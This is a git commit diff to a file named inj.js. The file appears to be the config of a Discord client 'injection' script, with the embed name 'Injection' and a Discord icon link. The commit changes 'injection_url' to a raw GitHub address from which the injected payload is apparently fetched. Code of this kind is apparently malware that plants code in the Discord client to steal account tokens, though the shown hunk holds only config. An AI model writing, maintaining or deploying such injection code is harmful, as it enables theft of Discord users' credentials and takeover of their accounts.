a89f3cd65b855cee364fd46ab7fc2f680ba228a1
valkzome <jakehurandes@gmail.com>
2024-07-28 00:47:55 -0700

    Update inj.js

--- inj.js
+++ inj.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfFIELwtf/inj.js', 
+  injection_url: 'https://raw.githubusercontent.com/valszla/wtfFIELwtf/main/inj.js', 
   /**
    
    **/
